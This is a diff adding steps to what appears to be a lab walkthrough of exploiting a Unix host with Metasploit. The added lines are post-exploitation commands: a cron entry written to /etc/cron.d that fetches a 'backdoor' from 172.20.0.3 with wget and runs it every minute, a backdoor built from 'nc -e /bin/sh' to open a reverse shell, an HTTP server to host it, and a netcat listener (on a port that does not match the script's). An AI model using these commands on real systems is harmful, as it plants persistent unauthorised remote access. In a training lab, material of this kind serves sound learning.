@@ -113,6 +113,29 @@ set payload cmd/unix/reverse
 exploit
 # this creates a shell
 whoami # root
+shell
+```
+
+From root shell:
+```bash
+# Leaving a backdoor
+echo '* * * * * root cd /tmp; wget 172.20.0.3/backdoor && chmod +x backdoor && ./backdoor' > /etc/cron.d/backdoor
+```
+
+From another kali terminal:
+```bash
+# write a backdoor script
+nc -e /bin/sh 172.20.0.3 4499
+
+# serve script using http server
+python3 -m http.server 80
+
+```
+
+From another kali terminal:
+```bash
+nc -nlvp 499
+# wait
 ```
 
 Go back to the session:
